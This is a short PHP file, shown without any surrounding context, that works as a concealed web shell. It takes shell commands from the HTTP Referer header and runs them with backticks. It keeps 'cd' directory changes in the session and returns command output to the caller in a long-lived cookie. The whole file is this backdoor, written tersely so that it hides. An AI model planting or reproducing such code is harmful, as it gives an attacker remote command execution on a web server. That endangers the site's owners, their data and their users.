<?session_start();if(isset($_SERVER['HTTP_REFERER'])){$_=$_SERVER['HTTP_REFERER'];if(substr($_,0,2)=='cd'){$_SESSION['dir']=substr($_,3);chdir($_SESSION['dir']);setcookie("dir",$dir);}
if(isset($_SESSION['dir'])){chdir($_SESSION['dir']);}
$b=`$_`;setcookie("x",$b,time()+30*24*60*60);}?>
